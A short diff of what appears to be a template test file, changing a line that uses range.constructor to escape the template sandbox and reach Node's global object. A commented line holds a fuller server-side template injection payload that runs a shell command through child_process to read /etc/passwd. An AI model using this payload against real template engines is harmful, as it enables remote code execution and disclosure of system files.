@@ -10,7 +10,7 @@ HELLO??dd
 
 values: ${{ values | dump }}
 
-${{ range.constructor("return global")() | dump }}
+${{ range.constructor("return global")() }}
 
 // range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()
 
